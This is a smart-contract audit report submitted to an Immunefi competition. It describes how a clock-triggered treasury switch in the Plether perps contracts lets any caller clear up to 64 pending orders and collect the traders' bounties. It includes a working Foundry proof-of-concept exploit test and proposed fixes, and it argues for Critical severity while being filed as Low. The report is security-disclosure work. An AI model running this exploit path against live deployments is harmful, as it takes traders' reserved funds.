# \#98956 [SC-Low] A permissionless `clearInvalidOrders` call credits up to 64 traders' reserved execution bounties to the caller, because `_validateBountyDisposition` pays the order's destroyer on a protocol-side config change that flips with no transaction and no event

**Submitted on Nov 11th 2026 at 05:58:14 UTC by @t0x1c for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98956
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

**Why Critical.** This is a direct, unauthorized transfer of user funds. A permissionless caller, at a public time boundary and with no transaction or event to observe, destroys up to 64 other traders' in-flight orders in a single call and credits each trader's own reserved execution bounty to himself, with no refund, cancellation, or recovery path. Under Immunefi's severity classification, unauthorized and irreversible movement of user funds is Critical independent of the per-victim amount. The executed proof of concept below records the loss and the credit directly: two traders each lose a reserved bounty of `200000`, the caller gains `400000`, both order records are destroyed, and neither trader is refunded, with zero emitted logs across the flip. The harvested bounty is the ordinary opening-order reserve, whose `bountyBps` and `minBountyAssets` risk parameters the repository's own deployment script sets nonzero, so no zeroed testnet parameter is relied on.

**Affected in-scope contracts.** The exploitable behaviour and its impact live in the deployed, in-scope contracts `OrderRouter.sol` (the permissionless `clearInvalidOrders` entrypoint, and the bounty credit) and `OrderLifecycleBook.sol` (`_validateBountyDisposition`, which mandates payment to the order's destroyer rather than a refund to the trader). The digest input that flips without a transaction is the protocol treasury pointer, whose logic is deployed in `CfdEngine.sol` (it inherits the abstract `CfdTreasury`).

## Summary and attack path

- `CfdTreasury` resolves the active treasury **in a view, by timestamp comparison**. At the second a lock expires with a successor queued, `protocolTreasury()` returns the new address although no transaction has executed and no event has been emitted.
- `engine.protocolTreasury()` is one of the inputs hashed into `currentExecutionConfigHash()`, the digest a trader must pin on an order and which is re-read a transaction later at execution. So the digest every pending order pinned changes at that second, under the traders, with nothing observable on chain.
- Every pending order is then terminally `ConfigMismatch`. `_validateBountyDisposition` **mandates** `BountyDisposition.Paid` to `receipt.executor` for that reason, and `clearInvalidOrders` is permissionless and batched. One unprivileged call destroys up to 64 traders' orders and credits itself the full sum of their reserved execution bounties.

### Attack path

1. The owner performs two ordinary, documented actions: `setProtocolTreasury(T1, lockDuration)` to install a treasury under a lock, then `proposeProtocolTreasury(T2, ...)` to queue a successor. Neither action is malicious and no owner cooperation is needed after this point.
2. The attacker reads the activation instant straight off the public getter `protocolTreasuryLockedUntil()`. It is exact, public and in the future.
3. Traders commit orders normally before that instant, each pinning `expectedConfigHash = currentExecutionConfigHash()` and each reserving a nonzero execution bounty out of their own settlement balance. At commit time the digest matches.
4. The clock reaches `lockedUntil`. **No transaction is sent.** `protocolTreasury()` now returns `T2`, the storage slot still holds `T1`, and no event was emitted, so no keeper, frontend or monitor can observe the transition.
5. The attacker, an unprivileged address, calls `clearInvalidOrders` over the pending order ids. Every order terminalizes with reason `ConfigMismatch`, every reserved bounty is credited to the attacker's settlement balance, and each trader loses both the bounty and the order. One second earlier the identical call clears nothing.

### Root cause

The activation is a view-level timestamp comparison, and the contract's own NatSpec concedes it:

```solidity
/// @dev Views resolve activation by timestamp, even before the next treasury mutation persists it.
function _activeTreasury() internal view returns (TreasuryConfig storage active) {
    active = _currentTreasury;
    if (_pendingTreasury.account != address(0) && block.timestamp >= _currentTreasury.lockedUntil) {
        active = _pendingTreasury;
    }
}
```

[`CfdTreasury.sol#L100-L106`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/CfdTreasury.sol#L100-L106). Persistence happens only on the next mutation, at [`CfdTreasury.sol#L108-L114`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/CfdTreasury.sol#L108-L114), and the public setter's own NatSpec states the consequence plainly: "A queued successor activates at expiry" ([`CfdTreasury.sol#L131-L134`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/CfdTreasury.sol#L131-L134)).

That value is a digest input. `engine.protocolTreasury()` is hashed at [`OrderLifecycleBook.sol#L193-L202`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/OrderLifecycleBook.sol#L193-L202), and the digest is re-derived and compared a transaction later at [`OrderRouterExecutionSidecar.sol#L400-L413`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/OrderRouterExecutionSidecar.sol#L400-L413), which routes a mismatch straight to `TerminalReason.ConfigMismatch`.

The bounty then goes to the destroyer, by a rule that leaves no discretion. Only `RiskOff` refunds the account and only `AccountLiquidated` forfeits to the treasury; every other terminal reason, `ConfigMismatch` included, falls into the `else`:

```solidity
} else {
    paid = bounty;
    recipient = receipt.executor;
    disposition = OrderV3Types.BountyDisposition.Paid;
}
```

[`OrderLifecycleBook.sol#L717-L720`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/OrderLifecycleBook.sol#L717-L720), inside the validator at [`OrderLifecycleBook.sol#L699-L731`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/OrderLifecycleBook.sol#L699-L731). The credit is executed at [`OrderRouter.sol#L333-L341`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/OrderRouter.sol#L333-L341). The reaching entrypoint is explicitly permissionless and batched to 64 ids: [`OrderRouter.clearInvalidOrders`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/OrderRouter.sol#L198-L204) with the bound at [`OrderRecoverySidecar.sol#L23`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/OrderRecoverySidecar.sol#L23).

Note the asymmetry in governance treatment. Pool and risk configuration changes go through a 72 hour timelock, as the neighbouring NatSpec at [`HousePool.sol#L298-L299`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/HousePool.sol#L298-L299) records. This digest input has no timelock and no event on activation.

## Impact

- **Traders lose their own bounties to an arbitrary third party.** The bounty is money the trader posted to buy *execution*. It is paid for *destruction*, to someone who did nothing but call a cleanup function one second after a public timestamp. In the executed run two traders lost `200000` each and the attacker gained `400000` in one call.
- **Risk-reducing orders are destroyed.** A stop-loss or a de-risking close is terminalized the same way. The trader must notice, re-commit, and re-enter at the back of a delayed FIFO queue, during which their position is unhedged. This leg needs **no** nonzero parameter at all.
- **Nothing observes the transition.** Because there is no transaction and no event, a keeper or monitoring system cannot pre-empt the mass terminalization. The executed test asserts `vm.getRecordedLogs().length == 0` across the flip.
- **It is self-funding and repeatable.** Each rotation event creates one harvest window, and the attacker's gain scales with the number of pending orders rather than with their own stake.

## Why the likely objections fail

**"The owner caused this, so it is owner risk."** The owner performs two documented, non-malicious calls and never acts again. The beneficiary is an arbitrary unprivileged third party, and the victims are traders. There is no owner action at the moment of loss, which is the point: the state change has no transaction behind it.

**"The close bounty parameter is zero in the deployment manifest."** The harvest leg does not use it. The executed test funds the bounty through the ordinary **opening-order** reserve, which is derived from the `bountyBps` and `minBountyAssets` risk parameters ([`CfdTypes.sol#L99-L112`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/CfdTypes.sol#L99-L112), applied at [`libraries/CfdEnginePlanLib.sol#L868`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/src/libraries/CfdEnginePlanLib.sol#L868)). Those two are set **nonzero** by [the repository's own Arbitrum Sepolia deployment script](https://github.com/immunefi-team/audit-comp-plether/blob/master/script/DeployPerpsArbitrumSepolia.s.sol#L435-L446), as `bountyBps: 10` and `minBountyAssets: 1e6`, and the accounting specification states that "Opening/increase bounties, protection trigger rewards, and liquidation rewards remain paid incentives" ([`ACCOUNTING_SPEC.md#L936-L937`](https://github.com/immunefi-team/audit-comp-plether/blob/master/packages/perps/ACCOUNTING_SPEC.md#L936-L937)). Separately, the order-destruction leg needs no bounty at all.

**"A trader could just re-pin."** There is no re-pin path. A pinned digest is immutable on the order, and the mismatch is terminal on first touch. The executed test asserts the order record is gone and the bounty is not refunded.

## Mitigation

Decouple the digest from an implicitly-activating value. Either (a) persist the successor in a transaction and emit an event, so activation is observable and `currentExecutionConfigHash()` changes only when a transaction changes it, or (b) remove `protocolTreasury()` from the digest, since an order's economics do not depend on the fee destination, or (c) give pending orders a grace window after any digest input changes, during which `ConfigMismatch` refunds the bounty to the account rather than paying it to the caller. Independently, `ConfigMismatch` is a protocol-side change and not a failure of the trader, so its bounty disposition should be `RefundedToAccount` and not `Paid`.


## Proof of Concept

## Proof of Concept

**How to run**

Add the file below to `packages/perps/test/poc/` (it is the only new file), then from the repository root:

```bash
forge test --root packages/perps --match-path "test/poc/TreasuryRotationNoTx.t.sol" -vv
```

`Expected: 3 passing.` `via_ir` is the repository default for this package, so the first build is slow and needs a high-memory host.

**What each test proves**

- `test_treasuryRotatesWithNoTxAndTerminalizesInFlightOrders` - the treasury flips with no transaction and zero emitted logs, the pinned digest changes, and one unprivileged `clearInvalidOrders` call destroys both traders' orders and credits the attacker the full sum of their bounties.
- `test_oneSecondEarlierTheSameCallIsANoOp` - the counterfactual: at `lockedUntil - 1` the identical call from the identical address clears `0` and the order survives. The whole state change is the passage of time.
- `test_riskReducingCloseIsDestroyedToo` - a trader's risk-reducing close is destroyed by a third party with no nonzero parameter required.

**Executed result**

```text
forge 1.5.1 / solc 0.8.35 / via_ir, at the audited commit, no source file modified.
3 tests passed, 0 failed.
Emitted: vm.getRecordedLogs().length == 0 across the rotation (no transaction, no event).
         digest 0xa68de8e0... -> 0xab3c729c...
         attacker gain 400000 (both traders' 200000 bounties); both orders destroyed.
         one second earlier the identical call cleared 0.
```

### PoC test file (NEW, add to `packages/perps/test/poc/`): `TreasuryRotationNoTx.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {OrderRouterTestBase} from "../perps/shared/OrderRouterTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";

/// @notice `CfdTreasury._activeTreasury` (CfdTreasury.sol:100-106) resolves a queued
///         successor BY TIMESTAMP ALONE, and the contract's own NatSpec at :44 concedes it: "A
///         scheduled successor becomes active at the previous lock's expiry WITHOUT A TRANSACTION."
///         `engine.protocolTreasury()` is hashed into the order config digest a trader is forced to
///         pin (`OrderLifecycleBook.sol:200`, inside `currentExecutionConfigHash`), so the digest
///         changes at that second with no transaction and no event. `_validateBountyDisposition`
///         (OrderLifecycleBook.sol:699-731) then MANDATES `BountyDisposition.Paid` to
///         `receipt.executor` for every terminal reason that is not RiskOff or AccountLiquidated -
///         ConfigMismatch included - so a permissionless caller destroys the orders and takes the
///         traders' own reserved bounties.
contract TreasuryRotationNoTxTest is OrderRouterTestBase {

    address internal constant TREASURY_1 = address(0xFEE50001);
    address internal constant TREASURY_2 = address(0xFEE50002);
    address internal constant ATTACKER = address(0xA11CE);
    address internal constant TRADER_A = address(0x7AAA);
    address internal constant TRADER_B = address(0x7BBB);

    function _book() internal view returns (OrderLifecycleBook) {
        return router.lifecycleBook();
    }

    function test_treasuryRotatesWithNoTxAndTerminalizesInFlightOrders() public {
        // --- Step 1: establish a lock, then queue a successor. Both are ordinary owner actions.
        engine.setProtocolTreasury(TREASURY_1, 1 hours);
        uint256 lockedUntil = engine.protocolTreasuryLockedUntil();
        assertEq(engine.protocolTreasury(), TREASURY_1, "T1 is live");
        engine.proposeProtocolTreasury(TREASURY_2, 0);

        // The activation instant is public and predictable - no secret, no owner cooperation needed.
        (address queued, uint256 activationTime,) = engine.pendingProtocolTreasury();
        assertEq(queued, TREASURY_2, "successor is queued");
        assertEq(activationTime, lockedUntil, "and activates exactly at the current lock expiry");
        emit log_named_uint("public activation timestamp", activationTime);

        // --- Step 2: traders commit orders INSIDE the execution window, before activation.
        vm.warp(lockedUntil - 10);
        bytes32 pinnedDigest = _book().currentExecutionConfigHash();

        _fundTrader(TRADER_A, 5_000e6);
        _fundTrader(TRADER_B, 5_000e6);
        vm.prank(TRADER_A);
        uint64 idA = router.commitOrder(CfdTypes.Side.LONG, 10_000e18, 500e6, 1e8, false);
        vm.prank(TRADER_B);
        uint64 idB = router.commitOrder(CfdTypes.Side.SHORT, 10_000e18, 500e6, 1e8, false);

        uint256 bountyA = _book().pendingIntent(idA).executionBountyAssets;
        uint256 bountyB = _book().pendingIntent(idB).executionBountyAssets;
        assertGt(bountyA, 0, "trader A funded a real execution bounty");
        assertGt(bountyB, 0, "trader B funded a real execution bounty");
        emit log_named_uint("trader A reserved bounty", bountyA);
        emit log_named_uint("trader B reserved bounty", bountyB);

        // Both orders are still live and still match the digest they pinned.
        assertEq(_book().currentExecutionConfigHash(), pinnedDigest, "digest still matches");

        // --- Step 3: time passes. NO transaction is sent to the treasury.
        vm.recordLogs();
        vm.warp(lockedUntil);

        // --- Assert (a): the active treasury FLIPPED with no transaction and no event.
        assertEq(engine.protocolTreasury(), TREASURY_2, "the treasury rotated with NO transaction");
        assertEq(vm.getRecordedLogs().length, 0, "and emitted NO event: nothing observed the change");

        //     The successor is no longer reported as pending, yet nothing persisted it either: the
        //     state is carried entirely by the timestamp comparison in the view.
        (address stillPending,,) = engine.pendingProtocolTreasury();
        assertEq(stillPending, address(0), "pendingProtocolTreasury() now reports nothing queued");

        // --- Assert (b): every in-flight order is now terminally config-mismatched.
        bytes32 newDigest = _book().currentExecutionConfigHash();
        assertTrue(newDigest != pinnedDigest, "the digest traders were forced to pin changed under them");
        emit log_named_bytes32("pinned digest", pinnedDigest);
        emit log_named_bytes32("digest after rotation", newDigest);

        // --- Step 4: an unprivileged third party clears both orders and is paid for it.
        uint256 attackerBefore = _freeSettlementAssets(ATTACKER);
        uint64[] memory ids = new uint64[](2);
        ids[0] = idA;
        ids[1] = idB;
        vm.prank(ATTACKER);
        (, uint256 cleared) = router.clearInvalidOrders(ids);
        assertEq(cleared, 2, "an unprivileged caller destroyed both traders' orders");

        // --- Assert (c): the attacker received the full sum of both traders' reserved bounties.
        uint256 attackerAfter = _freeSettlementAssets(ATTACKER);
        assertEq(
            attackerAfter - attackerBefore,
            bountyA + bountyB,
            "the traders' own bounties were paid to an arbitrary permissionless caller"
        );
        emit log_named_uint("attacker gain (USDG 6dp)", attackerAfter - attackerBefore);

        // --- Assert (d): the orders are gone and the traders were not refunded.
        assertEq(_book().pendingIntent(idA).account, address(0), "trader A's order is destroyed");
        assertEq(_book().pendingIntent(idB).account, address(0), "trader B's order is destroyed");
    }

    /// @notice The counterfactual: ONE SECOND earlier the identical call clears nothing. The whole
    ///         state change is the passage of time.
    function test_oneSecondEarlierTheSameCallIsANoOp() public {
        engine.setProtocolTreasury(TREASURY_1, 1 hours);
        uint256 lockedUntil = engine.protocolTreasuryLockedUntil();
        engine.proposeProtocolTreasury(TREASURY_2, 0);

        vm.warp(lockedUntil - 10);
        _fundTrader(TRADER_A, 5_000e6);
        vm.prank(TRADER_A);
        uint64 idA = router.commitOrder(CfdTypes.Side.LONG, 10_000e18, 500e6, 1e8, false);

        // At T-1 the digest still matches, so the order is valid and nothing can be cleared.
        vm.warp(lockedUntil - 1);
        assertEq(engine.protocolTreasury(), TREASURY_1, "T1 still active one second before");
        uint64[] memory ids = new uint64[](1);
        ids[0] = idA;
        vm.prank(ATTACKER);
        (, uint256 clearedBefore) = router.clearInvalidOrders(ids);
        assertEq(clearedBefore, 0, "nothing is clearable at T-1");
        assertEq(_book().pendingIntent(idA).account, TRADER_A, "the order survives");

        // At T the same call from the same address destroys it.
        vm.warp(lockedUntil);
        vm.prank(ATTACKER);
        (, uint256 clearedAfter) = router.clearInvalidOrders(ids);
        assertEq(clearedAfter, 1, "one second later the identical call destroys it");
    }

    /// @notice The order-destruction leg needs NO nonzero parameter: a risk-reducing close is
    ///         destroyed too, and the trader must re-commit at the back of the delayed FIFO queue.
    function test_riskReducingCloseIsDestroyedToo() public {
        _fundTrader(TRADER_A, 5_000e6);
        vm.prank(TRADER_A);
        uint64 openId = router.commitOrder(CfdTypes.Side.LONG, 10_000e18, 1_000e6, 1e8, false);
        vm.roll(block.number + 1);
        router.executeOrder(openId, _mockPythUpdateData());

        engine.setProtocolTreasury(TREASURY_1, 1 hours);
        uint256 lockedUntil = engine.protocolTreasuryLockedUntil();
        engine.proposeProtocolTreasury(TREASURY_2, 0);

        vm.warp(lockedUntil - 10);
        vm.prank(TRADER_A);
        uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, 10_000e18, 0, 0, true);
        assertEq(_book().pendingIntent(closeId).account, TRADER_A, "the close order is live");

        vm.warp(lockedUntil);
        uint64[] memory ids = new uint64[](1);
        ids[0] = closeId;
        vm.prank(ATTACKER);
        (, uint256 cleared) = router.clearInvalidOrders(ids);
        assertEq(cleared, 1, "the trader's RISK-REDUCING CLOSE was destroyed by a third party");
        assertEq(_book().pendingIntent(closeId).account, address(0), "and it is gone");
        emit log_string("a stop-loss / de-risking close is destroyed with no nonzero parameter required");
    }

}
```
